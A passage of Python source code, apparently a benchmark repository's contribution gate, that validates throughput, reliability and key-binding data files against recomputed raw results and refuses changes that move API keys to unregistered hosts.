            problems.append((where, "model %r is not one of %r's models in providers.json" % (model, prov)))
        if not is_iso_date(r["date"]):
            problems.append((where, "date must be YYYY-MM-DD, got %r" % (r["date"],)))
        elif after_today(r["date"], today):
            problems.append((where, "date %s is after today (%s): a draw from the future is a row nobody took, "
                                    "and rank.py takes the LATEST row per provider" % (r["date"], today)))
        else:
            _in_date_order(where, label, (str(prov), str(model)), r["date"], ledger, problems,
                           one_per_day=True, what="bench/draw_day.py")
        su = r["started_utc"]
        if (not isinstance(su, str) or not re.fullmatch(r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z", su)
                or not is_iso_date(su[:10]) or after_today(su[:10], today)):
            problems.append((where, "started_utc must be YYYY-MM-DDTHH:MM:SSZ and not after today, got %r" % (su,)))
        shape_ok = True
        for k in ("pace_basis", "tokens_per_hour_basis", "stopped_because", "note"):
            if not one_line(r[k]):
                problems.append((where, "%s must be one line of text" % k))
                shape_ok = False
        if r["first_error"] is not None and not one_line(r["first_error"]):
            problems.append((where, "first_error must be one line of text or null"))
        for k in ("requests_ok", "requests_429", "requests_failed", "output_tokens_drawn"):
            if not is_int(r[k]) or r[k] < 0:
                problems.append((where, "%s must be a non-negative integer, got %r" % (k, r[k])))
                shape_ok = False
        for k in ("minutes_planned", "minutes_run"):
            if not is_num(r[k]) or r[k] <= 0:
                problems.append((where, "%s must be a positive number, got %r: a run with no length has no rate "
                                        "and no tokens" % (k, r[k])))
                shape_ok = False
        if not is_int(r["pace_rpm"]) or r["pace_rpm"] < 1:
            problems.append((where, "pace_rpm must be a positive integer, got %r" % (r["pace_rpm"],)))
            shape_ok = False
        if not isinstance(r["tokens_estimated"], bool):
            problems.append((where, "tokens_estimated must be true or false: it says whether the count is the "
                                    "provider's or words x 1.3"))
        if not shape_ok:
            continue
        ok, r429, failed = r["requests_ok"], r["requests_429"], r["requests_failed"]
        tokens, minutes, pace = r["output_tokens_drawn"], r["minutes_run"], r["pace_rpm"]
        stopped = r["stopped_because"]

        # The pace is the meter's decision, not the row's: what draw_day.py allows for this provider today.
        allowed, basis = D.pace_for(lim.get(prov) if isinstance(lim.get(prov), dict) else None)
        if pace > allowed:
            problems.append((where, "pace_rpm %d is above the %d bench/draw_day.py allows for %r (%s). The pace is "
                                    "the provider's published rpm, %d where none is published, never above "
                                    "%d; a row drawn faster than that is a row the meter did not write, or a "
                                    "provider hammered above its own limit." % (pace, allowed, prov, basis, D.DEFAULT_RPM, D.MAX_PACE_RPM)))
        # The metronome launches at most one request per 60/pace seconds: pace x minutes + 1 launches.
        total = ok + r429 + failed
        if total > pace * minutes + 1:
            problems.append((where, "%d requests in %.2f minutes at %d a minute. The metronome launches at most "
                                    "pace x minutes + 1 = %d; more requests than that were not paced."
                             % (total, minutes, pace, int(pace * minutes) + 1)))
        draw_bound = int(ok * D.MAX_TOKENS_PER_CALL * (1 + _usage_overshoot()))
        if tokens > draw_bound:
            problems.append((where, "%d output tokens from %d successful requests. The meter asks for at most %d "
                                    "tokens a call, so %d requests cannot have carried more than %d even with the "
                                    "%d%% a usage block may count past max_tokens."
                             % (tokens, ok, D.MAX_TOKENS_PER_CALL, ok, draw_bound, round(_usage_overshoot() * 100))))
        if tokens > D.TOKEN_CAP_MAX + in_flight_slack:
            problems.append((where, "output_tokens_drawn %d is above the most one run can hold: the cap is %d by "
                                    "default and at most %d with --i-know-this-spends-quota, plus the %d calls "
                                    "in flight when it closes." % (tokens, D.TOKEN_CAP, D.TOKEN_CAP_MAX, D.MAX_IN_FLIGHT)))
        cap_reached = stopped.startswith(D.CAP_STOP_PREFIX)
        if cap_reached:
            digits = re.sub(r"[^0-9]", "", stopped[len(D.CAP_STOP_PREFIX):].split(" output tokens")[0])
            cap = int(digits) if digits else None
            if cap is None or not 1 <= cap <= D.TOKEN_CAP_MAX:
                problems.append((where, "stopped_because names a token cap the meter cannot have run with: %r; "
                                        "--cap is at most %d" % (stopped, D.TOKEN_CAP_MAX)))
            elif tokens < cap:
                problems.append((where, "stopped_because says the cap of %d was reached, and %d tokens were drawn. "
                                        "A cap stop that did not reach the cap is a rate rule being claimed, "
                                        "not a stop." % (cap, tokens)))
            elif tokens > cap + in_flight_slack:
                problems.append((where, "the cap of %d closed the run at %d tokens; it closes within the %d calls "
                                        "in flight, so at most %d could have arrived." % (cap, tokens, D.MAX_IN_FLIGHT, cap + in_flight_slack)))
        rate = r["tokens_per_hour_drawn"]
        if rate is None:
            continue
        if not is_int(rate) or rate < 0:
            problems.append((where, "tokens_per_hour_drawn must be a non-negative integer or null"))
            continue
        if not D.rate_allowed(minutes, ok, cap_reached):
            problems.append((where, "an hourly rate is stated from %.1f minutes and %d successful requests, stopped by "
                                    "%r. bench/draw_day.py states one only after %d minutes, or when the token "
                                    "cap ended the run after at least %d minutes and %d successful requests; "
                                    "under that the row carries null, because an hour scaled up from less is "
                                    "arithmetic, not measurement." % (minutes, ok, stopped, D.MIN_MINUTES_FOR_RATE,
                                                                        D.CAP_STOP_MIN_MINUTES, D.CAP_STOP_MIN_REQUESTS)))
            continue
        expected = tokens / minutes * 60
        if abs(rate - expected) > RATE_TOLERANCE * max(rate, expected) + 2:
            problems.append((where, "tokens_per_hour_drawn is %s, but %d tokens over %.2f minutes scale to %.0f. "
                                    "rank.py multiplies this figure by 24 and puts it on the front page; one "
                                    "that does not follow from its own row is a number, not a measurement."
                             % (rate, tokens, minutes, expected)))
        ceiling = published_tpm(lim, prov)
        if ceiling is not None and rate > ceiling * 60:
            problems.append((where, "%s tokens an hour is above sixty times the %s a minute the provider publishes "
                                    "as its ceiling in limits.json. One of the two numbers is wrong, and the "
                                    "gate cannot tell which - so neither ships." % (rate, ceiling)))


# ---------------------------------------------------------------- data/reliability.json

def _reliability_from_results(results, providers):
    """What bench/reliability.py would write today from results/*/raw.json and providers.json: the per-
    provider counts, the runs, the observed empty 200s and the switches already set. None when there is
    no run to count. The same buckets, in the same order of tests, so the archive is a derivation the
    gate repeats rather than a number it types."""
    runs = sorted(results.glob("*/raw.json")) if results and results.is_dir() else []
    if not runs:
        return None
    per, traps = {}, []
    has_switch = {(p.get("name"), m.get("id")): m.get("extra_body")
                  for p in providers if isinstance(p, dict)
                  for m in (p.get("models") or []) if isinstance(m, dict) and m.get("extra_body")}
    for run in runs:
        try:
            raw = json.loads(run.read_text(encoding="utf-8"))
        except ValueError:
            return None
        for r in (raw.get("rows") if isinstance(raw, dict) else None) or []:
            if not isinstance(r, dict):
                continue
            d = per.setdefault(r.get("provider"), {"calls": 0, "ok": 0, "empty_200": 0, "rate_limited": 0,
                                                    "overloaded": 0, "timeout": 0, "other": 0})
            d["calls"] += 1
            code, text = r.get("http"), (r.get("text") or "").strip()
            if code == 200 and text:
                d["ok"] += 1
            elif code == 200:
                d["empty_200"] += 1
                key = (r.get("provider"), r.get("model"))
                traps.append({"provider": r.get("provider"), "model": r.get("model"), "probe": r.get("probe"),
                              "had_switch": bool(has_switch.get(key)), "switch": has_switch.get(key),
                              "run": run.parent.name})
            elif code == 429:
                d["rate_limited"] += 1
            elif code == 503:
                d["overloaded"] += 1
            elif code == 0:
                d["timeout"] += 1
            else:
                d["other"] += 1
    switched = [{"provider": p, "model": m, "switch": s} for (p, m), s in sorted(has_switch.items())]
    return {"runs": [r.parent.name for r in runs], "per": per, "observed": traps, "switched": switched}


def check_reliability(path, problems, providers, label="data/reliability.json", today=None, results=None):
    """The archived answered rates feed RESULTS.md section 6b, the README's TRAP block and the
    `answered_rate_archive` column of ranking.json, and bench/rank.py read the file while no gate
    opened it. A document is refused unless bench/reliability.py could have written it, and then
    unless it DID: every count is recomputed here from results/*/raw.json and providers.json.

      - measured_at a date that has happened; runs_included the run directories on disk, none of them
        later than measured_at; how, what and every switch description page-safe text;
      - one row per provider, a provider on file, counts non-negative integers that add up to calls,
        answered_rate equal to ok / calls to three decimals and inside [0, 1], the reading the rate
        earns in reliability.py's own three sentences;
      - observed empty 200s on known endpoints, probe names that fit a table cell, `switch` null exactly
        when `had_switch` is false and a documented reasoning switch when it is true, `run` one of the
        runs included; already_switched_off_by_us one entry per endpoint carrying a documented switch;
      - and every one of those recomputed from the raw runs: a row the raw file does not justify is
        refused with the recomputed value, so the fix is to re-run bench/reliability.py, not to type.
    """
    if not path.exists():
        return
    d = load_json(path, problems)
    if d is None:
        return
    today = today or today_utc()
    known = models_of(providers)
    where = label
    if not isinstance(d, dict):
        problems.append((where, "must be a JSON object"))
        return
    ma = d.get("measured_at")
    if not is_iso_date(ma):
        problems.append((where, "measured_at must be a date, YYYY-MM-DD"))
        ma = None
    elif after_today(ma, today):
        problems.append((where, "measured_at %s is after today (%s): an archive from the future" % (ma, today)))
    runs = d.get("runs_included")
    if not isinstance(runs, list) or not runs or not all(is_iso_date(r) for r in runs):
        problems.append((where, "runs_included must be a non-empty list of dates, YYYY-MM-DD: the runs the counts "
                                "came from, which are the directories under results/"))
        runs = [r for r in runs if is_iso_date(r)] if isinstance(runs, list) else []
    for r in runs:
        if after_today(r, today):
            problems.append((where, "runs_included names %s, after today (%s)" % (r, today)))
        elif ma and date.fromisoformat(r) > date.fromisoformat(ma):
            problems.append((where, "runs_included names %s, later than measured_at %s: a count of calls not yet "
                                    "made" % (r, ma)))
    for k in ("how",):
        if not is_text(d.get(k)):
            problems.append((where, "%s must say, in text, how the counts were made" % k))
        elif page_text_problem(d[k]):
            problems.append((where, "%s %s: it is rendered raw onto a generated page" % (k, page_text_problem(d[k]))))

    trap = d.get("reasoning_trap")
    if not isinstance(trap, dict):
        problems.append((where, "reasoning_trap must be an object with what, switches, observed and "
                                "already_switched_off_by_us"))
        trap = {}
    if not is_text(trap.get("what")):
        problems.append((where, "reasoning_trap.what must be text"))
    elif page_text_problem(trap["what"]):
        problems.append((where, "reasoning_trap.what %s" % page_text_problem(trap["what"])))
    sw_doc = trap.get("switches")
    if not isinstance(sw_doc, dict) or not all(isinstance(k, str) and isinstance(v, str) for k, v in sw_doc.items()):
        problems.append((where, "reasoning_trap.switches must be an object of switch name -> which family takes it"))
    else:
        for k, v in sw_doc.items():
            why = page_text_problem(k) or page_text_problem(v)
            if why:
                problems.append((where, "reasoning_trap.switches[%r] %s: it is rendered raw inside a code block on "
                                        "RESULTS.md, and a backtick or a second line leaves the block" % (k[:30], why)))
    observed = trap.get("observed")
    if not isinstance(observed, list):
        problems.append((where, "reasoning_trap.observed must be a list"))
        observed = []
    for i, t in enumerate(observed):
        t_where = "%s: observed[%d]" % (label, i)
        if not isinstance(t, dict):
            problems.append((t_where, "must be an object"))
            continue
        missing = [k for k in ("provider", "model", "probe", "had_switch", "switch", "run") if k not in t]
        if missing:
            problems.append((t_where, "lacks %s" % ", ".join(missing)))
            continue
        if t["provider"] not in known:
            problems.append((t_where, "provider %r is not in providers.json" % (t["provider"],)))
        elif t["model"] not in known[t["provider"]]:
            problems.append((t_where, "model %r is not one of %r's models in providers.json" % (t["model"], t["provider"])))
        if not isinstance(t["probe"], str) or not PROBE_NAME_OK.match(t["probe"]):
            problems.append((t_where, "probe must be a short name (letters, digits, - or _): it is a table cell"))
        if not isinstance(t["had_switch"], bool):
            problems.append((t_where, "had_switch must be true or false"))
        elif t["had_switch"]:
            if not isinstance(t["switch"], dict) or not t["switch"]:
                problems.append((t_where, "had_switch is true, so switch must be the reasoning switch that was set"))
            else:
                check_extra_body(t_where, t["switch"], problems)
        elif t["switch"] is not None:
            problems.append((t_where, "had_switch is false, so switch must be null"))
        if t["run"] not in runs:
            problems.append((t_where, "run %r is not in runs_included" % (t["run"],)))
    switched = trap.get("already_switched_off_by_us")
    if not isinstance(switched, list):
        problems.append((where, "reasoning_trap.already_switched_off_by_us must be a list"))
        switched = []
    seen_sw = set()
    for i, t in enumerate(switched):
        t_where = "%s: already_switched_off_by_us[%d]" % (label, i)
        if not isinstance(t, dict) or any(k not in t for k in ("provider", "model", "switch")):
            problems.append((t_where, "must be an object with provider, model and switch"))
            continue
        if t["provider"] not in known:
            problems.append((t_where, "provider %r is not in providers.json" % (t["provider"],)))
        elif t["model"] not in known[t["provider"]]:
            problems.append((t_where, "model %r is not one of %r's models in providers.json" % (t["model"], t["provider"])))
        if not isinstance(t["switch"], dict) or not t["switch"]:
            problems.append((t_where, "switch must be the reasoning switch providers.json sets for this model"))
        else:
            check_extra_body(t_where, t["switch"], problems)
        if (t["provider"], t["model"]) in seen_sw:
            problems.append((t_where, "a second entry for %s %s: the count of models switched off is the length "
                                      "of this list" % (t["provider"], t["model"])))
        seen_sw.add((t["provider"], t["model"]))

    rows = d.get("providers")
    if not isinstance(rows, list):
        problems.append((where, "providers must be a list of per-provider counts"))
        rows = []
    seen = set()
    for i, r in enumerate(rows):
        r_where = "%s: provider %r" % (label, str(r.get("provider", "<unnamed>"))[:30] if isinstance(r, dict) else "<row %d>" % i)
        if not isinstance(r, dict):
            problems.append((r_where, "must be an object"))
            continue
        prov = r.get("provider")
        if prov not in known:
            problems.append((r_where, "provider %r is not in providers.json" % (prov,)))
        if prov in seen:
            problems.append((r_where, "a second row for one provider: rank.py keeps one archive row per provider"))
        seen.add(prov)
        counts_ok = True
        for k in ("calls",) + RELIABILITY_COUNTS:
            if not is_int(r.get(k)) or r[k] < 0:
                problems.append((r_where, "%s must be a non-negative integer, got %r" % (k, r.get(k))))
                counts_ok = False
        rate = r.get("answered_rate")
        if not is_num(rate) or not 0 <= rate <= 1:
            problems.append((r_where, "answered_rate must be a number between 0 and 1, got %r" % (rate,)))
            counts_ok = False
        if not counts_ok:
            continue
        total = sum(r[k] for k in RELIABILITY_COUNTS)
        if total != r["calls"]:
            problems.append((r_where, "the outcomes add up to %d and calls is %d. Every call falls into exactly one "
                                      "bucket, so a row whose buckets do not add up to its calls was not counted "
                                      "by bench/reliability.py." % (total, r["calls"])))
        exact = r["ok"] / r["calls"] if r["calls"] else 0.0
        if abs(rate - round(exact, 3)) > 0.0005:
            problems.append((r_where, "answered_rate is %s, but ok / calls = %d / %d = %.3f. The rate is the "
                                      "counts; a rate that does not follow from its own row is a number, not a "
                                      "measurement." % (rate, r["ok"], r["calls"], exact)))
        note = r.get("note")
        if not is_text(note) or page_text_problem(note):
            problems.append((r_where, "note must be one line of page-safe text: it is a table cell on RESULTS.md"))
        else:
            earned = next(s for floor, s in RELIABILITY_READINGS if exact >= floor)
            if note != earned:
                problems.append((r_where, "note is %r, and a rate of %.3f earns %r in bench/reliability.py's own "
                                          "words. The reading is derived from the rate; a kinder sentence is a "
                                          "claim the counts do not make." % (note, exact, earned)))

    # And the whole document against the raw runs it says it counted.
    if results is None:
        results = path.resolve().parent.parent / "results"
    truth = _reliability_from_results(results, providers)
    if truth is None:
        problems.append((where, "no results/*/raw.json to recompute the archive from (looked in %s). An archived "
                                "run nobody can recount is a number typed; commit the raw run or drop the "
                                "archive." % results))
        return
    if runs != truth["runs"]:
        problems.append((where, "runs_included is %r, and results/ holds %r. The archive counts every run on disk; "
                                "re-run bench/reliability.py rather than editing the list." % (runs, truth["runs"])))
    by_name = {r.get("provider"): r for r in rows if isinstance(r, dict)}
    for name in sorted(set(by_name) | set(truth["per"])):
        r_where = "%s: provider %r" % (label, str(name)[:30])
        mine, theirs = by_name.get(name), truth["per"].get(name)
        if mine is None:
            problems.append((r_where, "results/ holds %d calls for this provider and the archive has no row for it; "
                                      "re-run bench/reliability.py" % theirs["calls"]))
            continue
        if theirs is None:
            problems.append((r_where, "the archive has a row and results/ holds no call for this provider: a row "
                                      "the raw runs do not justify"))
            continue
        diff = [(k, mine.get(k), theirs[k]) for k in ("calls",) + RELIABILITY_COUNTS if mine.get(k) != theirs[k]]
        if diff:
            problems.append((r_where, "the archive says %s, and results/*/raw.json counts %s. Every figure here is "
                                      "recomputed from the raw runs; an archive that disagrees with them was "
                                      "typed, not counted. Re-run bench/reliability.py."
                             % (", ".join("%s %r" % (k, m) for k, m, _ in diff),
                                ", ".join("%s %r" % (k, t) for k, _, t in diff))))
    mine_obs = sorted((str(t.get("provider")), str(t.get("model")), str(t.get("probe")), str(t.get("run")))
                      for t in observed if isinstance(t, dict))
    theirs_obs = sorted((str(t["provider"]), str(t["model"]), str(t["probe"]), str(t["run"])) for t in truth["observed"])
    if mine_obs != theirs_obs:
        problems.append((where, "reasoning_trap.observed lists %d empty 200s and results/*/raw.json holds %d "
                                "(200 with no text). The table of the trap is recomputed from the raw runs; "
                                "re-run bench/reliability.py." % (len(mine_obs), len(theirs_obs))))
    else:
        for t in observed:
            if not isinstance(t, dict) or not isinstance(t.get("had_switch"), bool):
                continue
            key = (t.get("provider"), t.get("model"))
            want = next((x for x in truth["observed"] if (x["provider"], x["model"]) == key), None)
            if want and (t["had_switch"] != want["had_switch"] or (want["had_switch"] and t.get("switch") != want["switch"])):
                problems.append((where, "observed %s %s says had_switch %r, and providers.json %s a switch for it "
                                        "today. The column is read from providers.json; re-run bench/reliability.py "
                                        "after changing a model's extra_body."
                                 % (key[0], key[1], t["had_switch"], "carries" if want["had_switch"] else "carries no")))
                break
    mine_sw = sorted((str(t.get("provider")), str(t.get("model")), json.dumps(t.get("switch"), sort_keys=True))
                     for t in switched if isinstance(t, dict))
    theirs_sw = sorted((str(t["provider"]), str(t["model"]), json.dumps(t["switch"], sort_keys=True)) for t in truth["switched"])
    if mine_sw != theirs_sw:
        problems.append((where, "already_switched_off_by_us lists %d models and providers.json carries a switch for "
                                "%d. The list is providers.json's extra_body entries, copied; re-run "
                                "bench/reliability.py after changing one." % (len(mine_sw), len(theirs_sw))))


# ---------------------------------------------------------------- key_bindings.json

def check_key_bindings(path, problems, maps):
    """The registry of where each key variable may go, compared with what providers.json and
    judges.json actually do this run. The in-run binding (bind_key) catches a variable used twice; it
    cannot catch a pull request that SWAPS two existing providers' URLs, because within that one file
    each variable still goes to exactly one host. The registry is the memory the in-run check lacks:
    every (key_env, host, role) in use must match a line here, and every line here must be in use."""
    used_host, used_role = maps["key_to_host"], maps["key_role"]
    if not path.exists():
        problems.append((REGISTRY, "missing. Every key variable a provider or judge names must be bound to its host "
                                   "and role in bench/%s, or a pull request can move a credential to another "
                                   "host as a side effect of an edit nobody reads as one." % REGISTRY))
        return
    d = load_json(path, problems)
    if d is None:
        return
    reg = d.get("bindings")
    if not isinstance(reg, dict):
        problems.append((REGISTRY, "needs a `bindings` object of key_env -> {host, role}"))
        return
    for key_env, host in sorted(used_host.items()):
        role, where = used_role.get(key_env), "%s: %s" % (REGISTRY, key_env)
        entry = reg.get(key_env)
        if not isinstance(entry, dict):
            problems.append((where, "is used by a %s on %s and has no line in bench/%s. Adding a provider means adding "
                                    "its binding in the same pull request, where a reviewer sees the key and the "
                                    "host side by side." % (role, host, REGISTRY)))
            continue
        if entry.get("host") != host or entry.get("role") != role:
            problems.append((where, "is bound to %s as a %s in bench/%s, and this pull request sends it to %s as a %s. "
                                    "Moving a credential to another host is never a side effect of another "
                                    "change: swapping two providers' URLs changes both bindings, and both are "
                                    "refused. If the provider genuinely moved, change the registry line in the "
                                    "same pull request, on purpose, where a reviewer sees it."
                             % (entry.get("host"), entry.get("role"), REGISTRY, host, role)))
    for key_env, entry in sorted(reg.items()):
        where = "%s: %s" % (REGISTRY, key_env)
        if (not isinstance(entry, dict) or set(entry) != {"host", "role"} or not is_text(entry.get("host"))
                or entry.get("role") not in ("provider", "judge")):
            problems.append((where, "a binding is {host, role} with role provider or judge, nothing else"))
        if key_env not in used_host:
            problems.append((where, "is in bench/%s and used by no provider or judge. Delete the line in the same pull "
                                    "request that retires the entry, or the registry rots into a list nobody "
                                    "checks - and a stale binding is a host a future contributor can point a "
                                    "key at without changing the file." % REGISTRY))


# ---------------------------------------------------------------- the whole house

def collect(root=None, today=None):
    """Every check, in the order main() runs them, on one binding map. Returns (problems, summary).
    Separated from main() so bench/test_contributions.py can run the real files through exactly this
    and compare the findings against a list it states out loud. The summary names EVERY file opened:
    a file bench/rank.py reads that is missing from that line is missing from the gate."""
    root = Path(root) if root else HERE
    today = today or today_utc()
    problems = []
    maps = new_bindings()
    providers = check_providers(root / "providers.json", problems, maps)
    check_judges(root / "judges.json", problems, maps, providers=providers)
    check_key_bindings(root / REGISTRY, problems, maps)
    names = {p.get("name") for p in providers if isinstance(p, dict)}
    limits = check_limits(root / "limits.json", problems, provider_names=names, hosts=hosts_of(providers))
    check_privacy(root / "privacy.json", problems, providers)
    langs = sorted((root / "languages").glob("*.json"))
    if not langs:
        problems.append(("bench/languages", "no language packs found"))
    for p in langs:
        check_language(p, problems, providers=providers)
    check_announced_deaths(root / "announced_deaths.json", problems, providers)
    data = root.parent / "data"
    check_uptime(data / "uptime.jsonl", problems, providers, today=today)
    check_throughput(data / "throughput.jsonl", problems, providers, limits, today=today)
    check_drawn(data / "drawn.jsonl", problems, providers, limits, today=today)
    check_reliability(data / "reliability.json", problems, providers, today=today, results=root.parent / "results")
    summary = ("checked providers.json, judges.json, %s, limits.json, privacy.json, announced_deaths.json, "
               "%d language pack(s), data/uptime.jsonl, data/throughput.jsonl, data/drawn.jsonl and "
               "data/reliability.json against results/ (today %s)" % (REGISTRY, len(langs), today))
    return problems, summary


def main(argv=None):
    ap = argparse.ArgumentParser(description="Refuse a contribution that could turn this benchmark into a "
                                             "credential harvester, a quota burner, or a publisher of "
                                             "numbers nobody measured.")
    ap.add_argument("--today", default=None,
                    help="YYYY-MM-DD in UTC; the day no measurement may be dated after. Default: today.")
    a = ap.parse_args(argv)
    if a.today is not None and not is_iso_date(a.today):
        ap.error("--today must be YYYY-MM-DD")
    try:
        problems, summary = collect(HERE, date.fromisoformat(a.today) if a.today else None)
    except json.JSONDecodeError as e:
        print("A data file is not valid JSON: %s" % e)
        return 2
    except Exception as e:
        print("gate could not run: %s: %s" % (type(e).__name__, e))
        return 2

    print(summary)
    if not problems:
        print("CLEAN - contributions are safe to merge.")
        return 0
    print("\n%d PROBLEMS - do not merge:\n" % len(problems))
    for where, what in problems:
        print("  %s\n      %s" % (where, what))
    return 1


if __name__ == "__main__":
    sys.exit(main())
